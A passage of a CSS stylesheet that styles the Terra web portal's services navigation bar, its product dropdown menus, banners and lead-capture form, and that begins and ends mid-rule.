			transform: scaleX(-1)
		}

		.zaz--standalone .nb__sva .all-sva-services .class-icon {
			display: inline-block;
			margin-top: 9px;
			margin-left: 22px
		}

		.zaz--standalone .nb__sva .all-sva-services:hover {
			opacity: .8;
			transition: .5s
		}

		.zaz--standalone .nb__sva .upArrowServices:before {
			content: '';
			position: absolute;
			left: 30px;
			bottom: 0;
			width: 0;
			height: 0;
			border-top: solid .5rem transparent;
			border-right: solid .5rem transparent;
			border-left: solid .5rem transparent;
			border-bottom: solid .5rem #2f302b;
			margin-left: -.5rem;
			display: block
		}

		.zaz--standalone .hidden-sva {
			transition: .3s;
			top: -40px
		}

		.zaz--standalone .sva-services-scroll-stop {
			overflow: hidden
		}

		.zaz--standalone .nb__sva__highlight {
			display: block;
			position: absolute;
			top: 0;
			right: 0;
			height: 40px;
			padding: 0;
			line-height: 1;
			z-index: 1;
			transition: opacity 200ms linear
		}

		.zaz--standalone .nb__sva__highlight:hover {
			opacity: .8
		}

		.zaz--standalone .nb__sva__loja-pronta {
			display: block;
			position: absolute;
			top: 0;
			left: 0;
			height: 40px;
			padding: 6px 15px;
			font-family: Ubuntu, OpenSans, sans-serif;
			line-height: 1;
			text-transform: uppercase;
			text-decoration: none;
			color: #fff;
			background-color: #7499b4;
			z-index: 1;
			transition: opacity 200ms linear
		}

		.zaz--standalone .nb__sva__loja-pronta:hover {
			opacity: .8
		}

		.zaz--standalone .nb__sva__loja-pronta__brand {
			display: inline-block;
			font-size: 15px;
			font-weight: 600;
			line-height: 28px;
			vertical-align: top
		}

		.zaz--standalone .icon-sva-nb__sva__loja-pronta__icon {
			width: 16px;
			height: 16px;
			background-size: 16px auto;
			vertical-align: text-top
		}

		.zaz--standalone .nb__sva__loja-pronta__text {
			display: inline-block;
			margin-left: 10px;
			padding-left: 10px;
			border-left: 1px solid rgba(255, 255, 255, .75);
			font-size: 12px;
			line-height: 1.2
		}

		.zaz--standalone .nb__sva__loja-pronta__text>strong {
			display: block;
			font-weight: 700
		}

		.zaz--standalone .showFundo:before {
			content: '';
			background-color: #000;
			width: 100%;
			height: 100%;
			position: absolute;
			z-index: 6;
			opacity: .8
		}

		.zaz--standalone .zaz-sva-container #barrads {
			display: flex;
			justify-content: space-between;
			font-family: Ubuntu, sans-serif;
			background-color: #fff;
			border-bottom: 1px #eee solid
		}

		.zaz--standalone .zaz-sva-container #barrads .icon-goto-light {
			background-image: url("https://s1.trrsf.com/update-1528753791/fe/zaz-mod-icons/svg/central/goto-light.svg")
		}

		.zaz--standalone .zaz-sva-container #barrads .icon-arrow-up {
			background-image: url("https://s1.trrsf.com/update-1528753791/fe/zaz-mod-icons/svg/central/arrow-up.svg")
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS {
			height: 40px;
			display: flex;
			align-items: center
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul {
			display: inline-flex;
			list-style-type: none;
			padding: 0;
			position: relative
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li {
			padding: 0 11px;
			text-transform: uppercase;
			font-size: 14px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a {
			color: #707070;
			text-decoration: none
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a i {
			position: relative;
			top: 2px;
			left: 5px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a i.orange {
			color: #ff7212
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a i.blue {
			color: #0092c8
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a.arrow {
			text-shadow: 0 0 0 #000
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a.arrow:after {
			content: '';
			width: 0;
			height: 0;
			border-left: 10px solid transparent;
			border-right: 10px solid transparent;
			border-top: 10px solid #eee;
			position: relative;
			top: 41px;
			left: 30%;
			z-index: 999;
			display: block;
			margin-top: -10px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a.product {
			padding-top: 12px;
			padding-bottom: 12px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a.product:after {
			top: 81px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a.product .orange path {
			fill: #ff7212 !important
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a.product .blue {
			fill: #0092c8 !important
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a.assin,
		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a.ven {
			padding-top: 12px;
			padding-bottom: 12px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a.orange {
			color: #ff7212
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a.blue {
			color: #0092c8
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li a .hideArrow:after {
			visibility: hidden
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .js-container {
			display: none
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .show {
			display: block
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .product:after {
			border: none
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products {
			position: absolute;
			top: 28px;
			left: 0;
			width: 992px;
			padding-bottom: 30px;
			border-bottom: 1px #eee solid;
			background-color: #fff
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .logo {
			height: 60px;
			background-color: #eee;
			display: flex;
			align-items: center
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .logo a {
			display: flex
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .logo a img {
			width: 155px;
			height: 40px;
			margin-left: 30px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center {
			display: flex;
			justify-content: space-between;
			padding-top: 20px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 {
			display: flex;
			flex-flow: row wrap
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .line {
			display: flex;
			padding: 0 0 17px 18px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .line .product-hover .box-product {
			width: 292px;
			height: 70px;
			display: flex;
			align-items: center;
			-webkit-border-radius: 5px;
			-moz-border-radius: 5px;
			border-radius: 5px;
			border: solid 1px #707070;
			margin: 0 10px;
			position: relative;
			font-weight: 700
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .line .product-hover .box-product .info-ds {
			display: flex;
			align-items: center;
			margin-left: 30px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .line .product-hover .box-product .info-ds p {
			padding-left: 8px;
			display: flex;
			align-items: center
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .line .product-hover .box-product .info-ds p img {
			width: 80px;
			padding-left: 3px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .line .product-hover .box-product .info-ds .icon-sva-vitrine {
			background-image: url("https://www.terraempresas.com.br/vitrine/assets/img/logo-vitrine.svg");
			background-repeat: no-repeat;
			width: 220px;
			background-size: contain
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .line .product-hover .box-product .info-ds .icon-20.icon-sva-revistas-digitais {
			height: 30px !important;
			background-size: 19px auto !important
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .line .product-hover .box-product .description {
			display: none;
			padding-left: 20px;
			padding-right: 20px;
			top: 20px;
			left: 20px;
			font-size: 14px;
			text-transform: initial;
			font-weight: 400
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .goread .product-hover:hover .box-product {
			background-color: rgba(12, 149, 203, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .goread .product-hover .box-product {
			color: #0092c7;
			border-color: #0092c7
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .assistencia .product-hover:hover .box-product {
			background-color: rgba(245, 150, 0, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .assistencia .product-hover .box-product {
			color: #f59600;
			border-color: #f59600
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .backup .product-hover:hover .box-product {
			background-color: rgba(229, 0, 0, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .backup .product-hover .box-product {
			color: #e50000;
			border-color: #e50000
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .cursos-online .product-hover:hover .box-product {
			background-color: rgba(229, 0, 0, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .cursos-online .product-hover .box-product {
			color: #e50000;
			border-color: #e50000
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .office-on .product-hover:hover .box-product {
			background-color: rgba(178, 82, 159, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .office-on .product-hover .box-product {
			color: #b2529f;
			border-color: #b2529f
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .ingles .product-hover:hover .box-product {
			background-color: rgba(82, 186, 177, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .ingles .product-hover .box-product {
			color: #52bab1;
			border-color: #52bab1
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .mail-gigante .product-hover:hover .box-product {
			background-color: rgba(238, 116, 0, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .mail-gigante .product-hover .box-product {
			color: #ee7400;
			border-color: #ee7400
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .antivirus .product-hover:hover .box-product {
			background-color: rgba(177, 4, 13, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .antivirus .product-hover .box-product {
			color: #b1040d;
			border-color: #b1040d
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .cursinho .product-hover:hover .box-product {
			background-color: rgba(5, 129, 105, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .cursinho .product-hover .box-product {
			color: #007072;
			border-color: #007072
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .musica .product-hover:hover .box-product {
			background-color: rgba(170, 82, 153, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .musica .product-hover .box-product {
			color: #aa5299;
			border-color: #aa5299
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .reforco .product-hover:hover .box-product {
			background-color: rgba(1, 120, 127, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .reforco .product-hover .box-product {
			color: #01787f;
			border-color: #01787f
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .terra-fibra .product-hover:hover .box-product {
			background-color: rgba(117, 69, 155, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-1 .terra-fibra .product-hover .box-product {
			color: #75459B;
			border-color: #75459B
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-2 {
			padding-right: 20px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-2 .banner {
			width: 278px;
			height: 332px;
			-webkit-border-radius: 5px;
			-moz-border-radius: 5px;
			border-radius: 10px;
			border: solid 1px #52bab1;
			text-transform: initial;
			background-image: url("https://p1.trrsf.com.br/image/fget/cf/0/0/0/0/0/0/svadata.terra.com.br/svabar-navbar/zaz-navbar-desk/banner-cursos-online.png")
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-2 .banner .content {
			padding: 20px;
			display: flex;
			flex-direction: column;
			height: 100%;
			justify-content: space-between
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-2 .banner .content p {
			font-family: 'Open Sans', sans-serif;
			font-size: 18px;
			line-height: 1.25;
			color: #53bab1;
			margin-top: 0
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-2 .banner .content a {
			width: 240px;
			height: 50px;
			font-size: 20px;
			-webkit-border-radius: 5px;
			-moz-border-radius: 5px;
			border-radius: 5px;
			background-color: #FF7212;
			border: solid 1px #53bab1;
			line-height: 1.2;
			letter-spacing: -.2px;
			text-align: center;
			color: #fff;
			padding: 10px 20px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-products .center .column-2 .banner .content a:hover {
			opacity: .8
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .construtor .product-hover:hover .box-product {
			background-color: rgba(0, 122, 196, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .construtor .product-hover .box-product {
			color: #007ac4;
			border-color: #007ac4
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .antivirus .product-hover:hover .box-product {
			background-color: rgba(166, 75, 149, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .antivirus .product-hover .box-product {
			color: #a64b95;
			border-color: #a64b95
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .hospedagem .product-hover:hover .box-product {
			background-color: rgba(196, 2, 13, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .hospedagem .product-hover .box-product {
			color: #c4020d;
			border-color: #c4020d
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .email-pro .product-hover:hover .box-product {
			background-color: rgba(177, 4, 13, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .email-pro .product-hover .box-product {
			color: #b1040d;
			border-color: #b1040d
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .loja .product-hover:hover .box-product {
			background-color: rgba(59, 145, 230, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .loja .product-hover .box-product {
			color: #3b91e6;
			border-color: #3b91e6
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .ads .product-hover:hover .box-product {
			background-color: rgba(95, 171, 22, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .ads .product-hover .box-product {
			color: #5fab16;
			border-color: #5fab16
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .dominio .product-hover:hover .box-product {
			background-color: rgba(212, 32, 35, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .dominio .product-hover .box-product {
			color: #d42023;
			border-color: #d42023
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .office .product-hover:hover .box-product {
			background-color: rgba(178, 82, 159, .1)
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .office .product-hover .box-product {
			color: #b2529f;
			border-color: #b2529f
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-1 .vitrine .product-name {
			display: none
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-2 .banner {
			height: 332px;
			border: solid 1px #ff7213;
			background-image: url("https://svadata.terra.com.br/svabar-navbar/zaz-navbar-desk/2021_esta-ai.png")
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-2 .banner .content p {
			padding-top: 34px;
			color: #fff;
			text-align: left;
			font-weight: 700
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-2 .banner .content p span {
			color: #fff
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li#empresas .column-2 .banner .content a {
			border: 1px #ff7213 solid
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li.sva-adicional {
			height: 0;
			display: none
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central {
			position: absolute;
			top: 27px;
			left: 0;
			width: 992px;
			padding: 30px;
			border-bottom: 1px #eee solid;
			background-color: #fff;
			text-transform: initial;
			border-top: 20px #eee solid
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .details {
			height: 69.4px;
			opacity: .9;
			-webkit-border-radius: 5px;
			-moz-border-radius: 5px;
			border-radius: 5px;
			border: solid 1px #efefef;
			margin-bottom: 20px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .details .content {
			padding: 11px 17px;
			display: flex;
			justify-content: space-between;
			align-items: center
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .details .content p {
			font-family: 'Open Sans', sans-serif;
			font-size: 16px;
			font-weight: 300;
			font-style: normal;
			font-stretch: normal;
			line-height: 1.38;
			letter-spacing: normal;
			text-align: left;
			color: #969696
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .details .content a {
			width: 131.9px;
			height: 37.3px;
			border-radius: 5px;
			background-color: #969696;
			font-size: 12px;
			line-height: 1.42;
			text-align: center;
			color: #fff;
			padding: 10px 0
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .details .content a:hover {
			background-color: #524d4d
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds {
			display: flex;
			justify-content: space-between
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main {
			width: 618px;
			height: 378px;
			color: #ff7213;
			-webkit-border-radius: 5px;
			-moz-border-radius: 5px;
			border-radius: 5px;
			border: solid 1px #eee;
			background-image: url("https://p1.trrsf.com.br/image/fget/cf/0/0/0/0/0/0/svadata.terra.com.br/svabar-navbar/zaz-navbar-desk/iStock-491804128.png")
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main.vendas {
			background-image: url("https://p1.trrsf.com.br/image/fget/cf/0/0/0/0/0/0/svadata.terra.com.br/svabar-navbar/zaz-navbar-desk/iStock-490875642.png")
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main.vendas .form-lead-ds #collect-lead-banner {
			height: 340px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main.vendas .form-lead-ds .collect-lead-content {
			background-color: transparent !important;
			padding: 0 !important;
			width: 290px !important;
			margin: inherit !important
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main.vendas .form-lead-ds .collect-lead-content input {
			border: solid 1px #969696 !important;
			-webkit-border-radius: 4px !important;
			-moz-border-radius: 4px !important;
			border-radius: 4px !important;
			width: 290px !important;
			color: #969694 !important;
			font-style: italic !important
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main.vendas .form-lead-ds .collect-lead-content input::placeholder {
			color: #86867f !important
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main.vendas .form-lead-ds .collect-lead-content #collect-lead_form-submit {
			width: 233px;
			height: 50px;
			border: solid 1px #ff7213;
			font-size: 19px;
			line-height: 1.2;
			text-align: center;
			color: #ff7213;
			margin-top: 50px;
			margin-right: 62px !important;
			background-color: #fff !important;
			float: inherit !important
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main.vendas .form-lead-ds .collect-lead-content #collect-lead_form-submit:hover {
			background-color: #ff7213 !important;
			color: #fff
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main.vendas .form-lead-ds .collect-lead-content .cl__privacy-policy {
			display: none
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main.vendas select {
			position: relative;
			top: -200px;
			width: 290px;
			height: 32px;
			color: #969694 !important;
			font-style: italic !important;
			border: solid 1px #969696 !important;
			-webkit-border-radius: 4px !important;
			-moz-border-radius: 4px !important;
			border-radius: 4px !important;
			padding-left: 12px;
			font-size: 14px !important
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main .content {
			padding: 33px 180px 0 33px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main .content h2 {
			font-size: 33px;
			font-weight: 600;
			line-height: 1.17;
			letter-spacing: -.4px;
			text-align: left
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main .content p {
			font-family: 'Open Sans', sans-serif;
			font-size: 14px;
			font-weight: 400;
			font-style: normal;
			font-stretch: normal;
			line-height: 1.25;
			letter-spacing: normal
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main .content .cta {
			padding: 50px 0
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main .content .cta a {
			width: 233px;
			height: 50px;
			font-size: 17px;
			color: #ff7213;
			-webkit-border-radius: 5px;
			-moz-border-radius: 5px;
			border-radius: 5px;
			background-color: rgba(255, 255, 255, .2);
			border: solid 1px #ff7213;
			padding: 16px;
			display: block;
			margin: 10px 0;
			text-align: center
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main .content .cta a:hover {
			background-color: #ff7213;
			color: #fff
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer {
			display: flex;
			flex-flow: column;
			justify-content: space-between
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .bottom,
		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .higher {
			width: 300px;
			height: 180px;
			-webkit-border-radius: 5px;
			-moz-border-radius: 5px;
			border-radius: 5px;
			border: solid 1px #eee
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .bottom .content,
		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .higher .content {
			padding: 20px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .bottom .content h3,
		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .higher .content h3 {
			font-size: 28px;
			color: #ff7213;
			line-height: 1.14;
			letter-spacing: -.3px;
			font-weight: 400;
			text-align: left
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .bottom .content h4,
		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .higher .content h4 {
			font-size: 34px;
			font-weight: 700;
			line-height: 1.15;
			letter-spacing: -.3px;
			color: #ff7213;
			text-align: left
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .bottom .content p,
		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .higher .content p {
			font-family: 'Open Sans', sans-serif;
			font-size: 14px;
			color: #ff7213;
			line-height: 1.43;
			padding: 7px 0
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .bottom .content .cta,
		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .higher .content .cta {
			padding-top: 14px
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .bottom .content .cta a,
		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .higher .content .cta a {
			font-family: 'Open Sans', sans-serif;
			font-size: 14px;
			line-height: 1.7;
			color: #969696;
			display: block
		}

		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .bottom .content .cta a:hover,
		.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .subcontainer .higher .content .cta a:hover {
			opacity: .3
		}

		.zaz--standalone .zaz-sva-container #barrads #fixedspace {
			width: 273px;
			min-width: 273px;
			height: 40px;
			background-color: #149acc
		}

		.zaz--standalone .zaz-sva-container #barrads #fixedspace ul {
			position: absolute;
			right: 430px;
			top: 14px
		}

		.zaz--standalone .zaz-sva-container #barrads #fixedspace ul .sva-adicional {
			height: 0;
			display: none
		}

		.zaz--standalone #cursoDS {
			height: 40px;
			background-color: #fff;
			display: flex;
			align-items: center;
			justify-content: space-evenly;
			width: 1510px;
			box-shadow: 0 1px 0 0 rgba(0, 0, 0, .2)
		}

		.zaz--standalone #cursoDS .more-services {
			width: 120px !important;
			background-size: 90% !important;
			margin-left: 5px !important
		}

		.zaz--standalone #cursoDS .all-sva-services {
			width: 180px;
			cursor: pointer;
			display: table;
			padding-top: 2px;
			background-color: #221E1F;
			height: 40px
		}

		.zaz--standalone #cursoDS .all-sva-services a {
			display: inline-block
		}

		.zaz--standalone #cursoDS .all-sva-services .small-icon {
			background-size: 80%
		}

		.zaz--standalone #cursoDS .all-sva-services .invert-icon {
			transform: scaleX(-1)
		}

		.zaz--standalone #cursoDS .all-sva-services .class-icon {
			display: inline-block;
			margin-top: 9px;
			margin-left: 22px
		}

		.zaz--standalone #cursoDS .all-sva-services:hover {
			opacity: .8;
			transition: .5s
		}

		.zaz--standalone #cursoDS .sva-destaque {
			display: flex;
			align-items: center;
			width: 1310px;
			margin-left: 20px
		}

		.zaz--standalone #cursoDS .sva-destaque a {
			display: flex;
			align-items: center;
			text-decoration: none;
			position: relative
		}

		.zaz--standalone #cursoDS .sva-destaque a .class-text {
			color: #006f72;
			font-weight: 700;
			font-size: 15px;
			text-transform: uppercase;
			margin: 0 5px
		}

		.zaz--standalone #cursoDS .sva-destaque a .class-text.black {
			color: #221E1F
		}

		.zaz--standalone #cursoDS .sva-destaque a .destaque {
			position: absolute;
			width: 95px;
			height: 15px;
			top: 20px;
			left: 2.8em;
			z-index: 9999;
			background: #ff6700;
			text-align: center;
			font-size: 9px;
			color: #fff;
			padding: 0
		}

		.zaz--standalone #cursoDS .sva-destaque .descricao {
			color: #ff6700;
			font-weight: 700;
			font-size: 15px
		}

		.zaz--standalone #cursoDS .sva-destaque .valor {
			font-size: 12px;
			color: #a8a8a8;
			margin: 0 10px
		}

		.zaz--standalone #cursoDS .sva-destaque .valor .cifrao,
		.zaz--standalone #cursoDS .sva-destaque .valor .mes {
			vertical-align: super
		}

		.zaz--standalone #cursoDS .sva-destaque .valor .preco {
			font-size: 19px;
			font-weight: 600
		}

		.zaz--standalone #cursoDS .sva-destaque .itens-menu {
			display: flex;
			flex-direction: column
		}

		.zaz--standalone #cursoDS .sva-destaque .itens-menu ul {
			display: inline-flex;
			align-items: center;
			overflow: hidden
		}

		.zaz--standalone #cursoDS .sva-destaque .itens-menu ul li a {
			color: #11797c;
			font-size: 14px;
			font-weight: 600
		}

		.zaz--standalone #cursoDS .sva-destaque .itens-menu ul li.line-separador {
			width: 1px;
			height: 15px;
			background: #11797c;
			margin: 4px 10px
		}

		.zaz--standalone #cursoDS .sva-destaque .itens-menu ul li.hide-m {
			display: none
		}

		.zaz--standalone #cursoDS .sva-destaque .itens-menu ul li:last-child {
			margin-left: 8px
		}

		.zaz--standalone #cursoDS .sva-destaque .itens-menu ul li:last-child a {
			color: #a8a8a8
		}

		.testeInglesAncora {
			background-color: #57bbb1 !important;
			height: 30px !important;
			color: #fff !important;
			-webkit-border-radius: 6px !important;
			-moz-border-radius: 6px !important;
			border-radius: 6px !important;
			padding: 0 10px !important;
			margin-top: 3px !important
		}

		.testeInglesHidden {
			display: none !important
		}

		.zaz--standalone .navbar-sva-desktop {
			position: relative;
			background-color: #fff;
			height: 40px;
			display: flex;
			justify-content: space-between;
			box-shadow: 0 1px 0 0 rgba(0, 0, 0, .2)
		}

		.zaz--standalone .navbar-sva-desktop__pulldown {
			width: 300px;
			display: flex;
			align-items: center;
			justify-content: center;
			margin-right: 10px
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__title {
			font-size: 15px;
			font-weight: 600
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__title__anchor {
			text-decoration: none;
			color: #343434;
			font-size: 14px
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__title__anchor__icon {
			margin-left: 8px
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background {
			position: absolute;
			top: 41px;
			left: 0;
			width: 99vw;
			height: 48vw;
			background: rgba(0, 0, 0, .7);
			display: none
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background.show {
			display: block
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content {
			width: 1076px;
			height: 556px;
			background-color: #fff
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__stripe {
			background-color: #eae9e9;
			display: flex;
			align-items: center;
			justify-content: space-between;
			height: 40px
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__stripe__service {
			font-size: 15px;
			font-weight: 700;
			text-transform: uppercase;
			margin: 0 40px;
			width: 100%
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__stripe__service--pf {
